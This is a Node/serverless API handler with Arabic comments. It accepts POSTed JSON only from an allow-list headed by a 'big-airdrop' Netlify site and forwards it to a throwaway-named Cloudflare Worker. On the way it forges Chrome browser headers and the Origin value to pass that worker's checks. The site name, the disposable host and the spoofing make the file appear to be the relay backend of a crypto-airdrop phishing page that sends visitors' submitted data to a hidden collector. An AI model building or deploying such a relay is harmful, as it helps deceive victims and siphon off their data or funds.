// api/submit.js
const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";

// أصول مسموحة (أضف/احذف حسب حاجتك)
const ALLOWED_ORIGINS = [
  "https://big-airdrop.netlify.app",
  "http://localhost:3000",
  "http://localhost:5173",
  "http://127.0.0.1:5500",
  "http://127.0.0.1:8080"
];

function originFromReferer(referer = "") {
  try { if (!referer) return ""; const u = new URL(referer); return `${u.protocol}//${u.host}`; }
  catch { return ""; }
}
function corsHeaders(origin) {
  return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    "Vary": "Origin"
  };
}

export default async function handler(req, res) {
  const reqOrigin = req.headers.origin || "";
  const referer = req.headers.referer || "";
  const derivedOrigin = reqOrigin || originFromReferer(referer);

  // GET للتشخيص
  if (req.method === "GET") {
    return res.status(200).json({
      ok: true, hint: "Use POST with JSON body",
      origin: reqOrigin || null, referer: referer || null, derivedOrigin, allowed: ALLOWED_ORIGINS
    });
  }

  // ✅ دعم preflight
  if (req.method === "OPTIONS") {
    if (!derivedOrigin || !ALLOWED_ORIGINS.includes(derivedOrigin)) {
      return res.status(403).json({ error: "Forbidden origin (preflight)", got: derivedOrigin || null });
    }
    return res.status(200).set(corsHeaders(derivedOrigin)).send("ok");
  }

  // السماح فقط بـ POST ومن أصل مسموح
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }
  if (!derivedOrigin || !ALLOWED_ORIGINS.includes(derivedOrigin)) {
    return res.status(403).set(corsHeaders(derivedOrigin || "*"))
      .json({ error: "Forbidden origin", got: derivedOrigin || null });
  }

  try {
    // رؤوس “متصفح حقيقية” + تمرير Origin لأن الـWorker يتحقق منه
    const forwardHeaders = {
      "Content-Type": "application/json",
      "Accept": "application/json,text/html;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "sec-ch-ua": '"Chromium";v="139", "Google Chrome";v="139", ";Not A Brand";v="99"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
      "Origin": derivedOrigin
    };

    const response = await fetch(WORKER_URL, {
      method: "POST",
      headers: forwardHeaders,
      body: JSON.stringify(req.body)
    });

    const raw = await response.text();
    let payload; try { payload = JSON.parse(raw); } catch { payload = { raw }; }

    return res.status(response.status).set(corsHeaders(derivedOrigin)).json(payload);
  } catch (err) {
    return res.status(500).set(corsHeaders(derivedOrigin || "*"))
      .json({ error: "Failed forwarding request", details: err?.message || "unknown" });
  }
}
